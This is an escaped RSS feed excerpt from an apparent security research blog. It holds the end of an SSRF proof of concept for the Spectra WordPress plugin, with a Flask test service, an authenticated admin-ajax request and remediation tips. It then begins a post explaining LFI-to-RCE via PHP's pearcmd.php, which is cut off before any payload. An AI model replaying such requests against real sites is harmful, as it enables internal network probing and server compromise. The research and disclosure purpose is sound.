&lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service with python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, jsonify, request, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/test&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;original_content&amp;#34;: &amp;#34;XNXX.COM&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a post and obtain the &lt;code&gt;_ajax_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Send a request with &lt;code&gt;api_uri&lt;/code&gt; pointing to the local service &lt;code&gt;http://127.0.0.1:8001/test&lt;/code&gt; as a &lt;strong&gt;Contributor&lt;/strong&gt; user&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7Cf3dc677b2e483f598ad00a36fbd2f18ed1ed5015b39fc2df533aeb573a8dc3fd; wp-settings-time-2=1761027443; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7C1e8333233a2233576e988302d4f19d5c92470de4cc2bf4c1e31fb65788a44d35&#xA;&#xA;action=ast_block_templates_importer&amp;amp;_ajax_nonce=3ef4c6d6df&amp;amp;api_uri=http://127.0.0.1:8001/test&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/result.png&#34; title=&#34;Read content from local service&#34; data-thumbnail=&#34;/posts/2025-10-23-cve-2023-36679/result.png&#34; data-sub-html=&#34;&lt;h2&gt;result&lt;/h2&gt;&lt;p&gt;Read content from local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-23-cve-2023-36679/result.png&#39; alt=&#34;result&#34; height=&#34;523&#34; width=&#34;1524&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Read content from local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Version &lt;code&gt;≤ 2.6.6&lt;/code&gt; of the &lt;code&gt;Spectra (Ultimate Addons for Gutenberg)&lt;/code&gt; plugin contains an SSRF vulnerability due to using &lt;code&gt;wp_remote_get()&lt;/code&gt; with a URL supplied by the user without restricting or validating its source.&#xA;This allows an account with &lt;strong&gt;Contributor&lt;/strong&gt; privileges to force the WordPress server to make requests to internal addresses.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not trust URLs from the client; only use data available on the server.&lt;/li&gt;&#xA;&lt;li&gt;Prefer &lt;strong&gt;&lt;code&gt;wp_safe_remote_get()&lt;/code&gt;&lt;/strong&gt; over &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Check HTTP response (status, MIME, content).&lt;/li&gt;&#xA;&lt;li&gt;Restrict who can make request calls to the minimum required role.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-addons-for-gutenberg/vulnerability/wordpress-spectra-plugin-2-6-6-server-side-request-forgery-ssrf-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Spectra Plugin &amp;lt;= 2.6.6 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Exploiting LFI2RCE Vulnerability via PHP PEARCMD</title>
      <link>http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/</link>
      <pubDate>Wed, 22 Oct 2025 20:48:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Hello. After analyzing 10 CVEs related to LFI in WordPress plugins, I noticed a common barrier: many exploitation vectors are constrained by the requirement to &lt;strong&gt;have a &lt;code&gt;.php&lt;/code&gt; suffix&lt;/strong&gt;. This significantly reduces exploitability. During my research I found the article &lt;a href=&#34;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;docker-php-include-getshell&lt;/a&gt;. That article describes a way to &lt;strong&gt;bypass the &lt;code&gt;.php&lt;/code&gt; constraint&lt;/strong&gt; by abusing the &lt;code&gt;pearcmd.php&lt;/code&gt; file which is part of PHP&amp;rsquo;s &lt;strong&gt;PECL/PEAR&lt;/strong&gt; toolkit and is present in WordPress environments deployed on Docker — a very practical trick for no-upload scenarios.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;what-are-pear-and-pecl&#34;&gt;&lt;span&gt;What are PEAR and PECL?&lt;/span&gt;&#xA;  &lt;a href=&#34;#what-are-pear-and-pecl&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PECL (PHP Extension Community Library)&lt;/strong&gt;: a command-line tool to install and manage PHP extensions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;PEAR (PHP Extension and Application Repository)&lt;/strong&gt;: the library platform used by PECL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Before PHP &lt;code&gt;7.3&lt;/code&gt;, PEAR/PECL were often installed by default.&#xA;From PHP &lt;code&gt;7.4&lt;/code&gt; onward, PHP must be compiled with &lt;code&gt;--with-pear&lt;/code&gt; to include them.&lt;/p&gt;&#xA;&lt;p&gt;However, in official PHP Docker images, PEAR/PECL &lt;strong&gt;are still often included&lt;/strong&gt;, located under &lt;code&gt;/usr/local/lib/php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# ls /usr/local/lib/php&#xA;Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;pearcmdphp-and-register_argc_argv&#34;&gt;&lt;span&gt;&lt;code&gt;pearcmd.php&lt;/code&gt; and &lt;code&gt;register_argc_argv&lt;/code&gt;&lt;/span&gt;&#xA;  &lt;a href=&#34;#pearcmdphp-and-register_argc_argv&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;pearcmd.php&lt;/code&gt; is a PHP script designed to run in CLI mode, for example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php /usr/local/lib/php/pearcmd.php install somepackage&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It processes arguments from &lt;code&gt;$argv&lt;/code&gt; and &lt;code&gt;$argc&lt;/code&gt;. When run as CLI this data is obvious. If this file is included in a web context (via LFI), its CLI logic can be abused.&lt;/p&gt;&#xA;&lt;p&gt;The key point is the &lt;code&gt;register_argc_argv&lt;/code&gt; setting. If &lt;code&gt;register_argc_argv = On&lt;/code&gt;, PHP will populate:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$argc&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$argv&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#34; title=&#34;`argv` in PHP configuration&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#34; data-sub-html=&#34;&lt;h2&gt;argv&lt;/h2&gt;&lt;p&gt;`argv` in PHP configuration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#39; alt=&#34;argv&#34; height=&#34;190&#34; width=&#34;844&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;`argv` in PHP configuration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;When WordPress is set up on Docker, &lt;code&gt;register_argc_argv&lt;/code&gt; is often enabled by default. The question becomes: when PHP runs under a web SAPI (FPM/Apache) and not in CLI, where does &lt;code&gt;$argv&lt;/code&gt; come from?&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis-of-php-source-code&#34;&gt;&lt;span&gt;Analysis of PHP Source Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis-of-php-source-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;In the PHP core there is logic like:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (PG(register_argc_argv)) {&#xA;    if (SG(request_info).argc) {&#xA;        ...&#xA;    } else {&#xA;        php_build_argv(SG(request_info).query_string, &amp;amp;PG(http_globals)[TRACK_VARS_SERVER]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If there is no &lt;code&gt;argc&lt;/code&gt; (not running CLI), PHP calls &lt;code&gt;php_build_argv&lt;/code&gt; with &lt;code&gt;SG(request_info).query_string&lt;/code&gt; — i.e., the URL&amp;rsquo;s &lt;strong&gt;query string&lt;/strong&gt;. For example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://example.com/index.php?a=b&amp;amp;c=d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;query_string = &amp;quot;a=b&amp;amp;c=d&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;PHP will use this query string to build the &lt;code&gt;argv&lt;/code&gt; variables, so &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; can be influenced by the query string.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Consequence&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;When &lt;code&gt;pearcmd.php&lt;/code&gt; is included via LFI in a web environment where &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; is generated from the query string, an attacker can control the command-line parameters that &lt;code&gt;pearcmd.php&lt;/code&gt; reads. Thus, PEAR/PECL command functionality can be abused via the web to perform unwanted actions.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;rfc3875-explain&#34;&gt;&lt;span&gt;RFC3875 Explain&lt;/span&gt;&#xA;  &lt;a href=&#34;#rfc3875-explain&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;RFC3875 (the CGI spec) defines a form of &lt;strong&gt;&amp;ldquo;indexed&amp;rdquo; HTTP query&lt;/strong&gt; — that is, a query string without unencoded &lt;code&gt;=&lt;/code&gt; characters sent via GET or HEAD.&lt;/p&gt;&#xA;&lt;p&gt;When encountering such a query, the server &lt;strong&gt;SHOULD&lt;/strong&gt; treat the query-string as a &lt;strong&gt;search-string&lt;/strong&gt;, splitting it into &lt;strong&gt;search-words&lt;/strong&gt; separated by &lt;code&gt;+&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;search-string = search-word ( &amp;#34;&amp;#43;&amp;#34; search-word )&#xA;search-word = 1*schar&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After splitting, each &lt;code&gt;search-word&lt;/code&gt; is URL-decoded, optionally re-encoded as system-defined, then &lt;strong&gt;added to the command-line argument list (&lt;code&gt;argv&lt;/code&gt;)&lt;/strong&gt; of the CGI program.&lt;/p&gt;&#xA;&lt;p&gt;In short: if the query-string contains no &lt;code&gt;=&lt;/code&gt; and is a GET or HEAD request, the server may treat parts separated by &lt;code&gt;+&lt;/code&gt; as arguments and pass them into &lt;code&gt;argv&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;RFC3875&lt;/strong&gt; allows a server to turn an &amp;ldquo;indexed&amp;rdquo; query-string (GET/HEAD, no unencoded &lt;code&gt;=&lt;/code&gt;) into an argv list. The spec excerpt:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;4.4. The Script Command Line&#xA;&#xA;Some systems support a method for supplying an array of strings to&#xA;the CGI script. This is only used in the case of an &amp;#39;indexed&amp;#39; HTTP&#xA;query, which is identified by a &amp;#39;GET&amp;#39; or &amp;#39;HEAD&amp;#39; request with a URI&#xA;query string that does not contain any unencoded &amp;#34;=&amp;#34; characters. For&#xA;such a request, the server SHOULD treat the query-string as a&#xA;search-string and parse it into words, using the rules&#xA;&#xA;search-string = search-word ( &amp;#34;&amp;#43;&amp;#34; search-word )&#xA;search-word = 1*schar&#xA;schar = unreserved | escaped | xreserved&#xA;xreserved = &amp;#34;;&amp;#34; | &amp;#34;/&amp;#34; | &amp;#34;?&amp;#34; | &amp;#34;:&amp;#34; | &amp;#34;@&amp;#34; | &amp;#34;&amp;amp;&amp;#34; | &amp;#34;=&amp;#34; | &amp;#34;,&amp;#34; |&#xA;&amp;#34;$&amp;#34;&#xA;&#xA;After parsing, each search-word is URL-decoded, optionally encoded in&#xA;a system-defined manner and then added to the command line argument&#xA;list.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PHP previously had a vulnerability related to this (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2012-1823&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2012-1823&lt;/a&gt;). Today, PHP handles the query-string more broadly than RFC suggests — even when the query-string contains &lt;code&gt;=&lt;/code&gt;, it can still be added to &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#34; title=&#34;PHP still adds query strings containing &amp;#39;=&amp;#39; into $_SERVER\[&amp;#39;argv&amp;#39;]&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#34; data-sub-html=&#34;&lt;h2&gt;equal&lt;/h2&gt;&lt;p&gt;PHP still adds query strings containing &amp;#39;=&amp;#39; into $_SERVER\[&amp;#39;argv&amp;#39;]&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#39; alt=&#34;equal&#34; height=&#34;276&#34; width=&#34;1058&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PHP still adds query strings containing &#39;=&#39; into $_SERVER\[&#39;argv&#39;]&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 By passing a query string like &lt;code&gt;?a+b+c+...&lt;/code&gt;, PHP will split on &lt;code&gt;+&lt;/code&gt; and create &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; as an array &lt;code&gt;[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, ...]&lt;/code&gt;, consistent with RFC3875 semantics.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;testing-pear-in-cli&#34;&gt;&lt;span&gt;Testing PEAR in CLI&lt;/span&gt;&#xA;  &lt;a href=&#34;#testing-pear-in-cli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The author&amp;rsquo;s article mentions a payload related to &lt;code&gt;config-create&lt;/code&gt;, described as used to create a configuration file.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#34; title=&#34;Description of config-create&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#34; data-sub-html=&#34;&lt;h2&gt;doc-config&lt;/h2&gt;&lt;p&gt;Description of config-create&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; 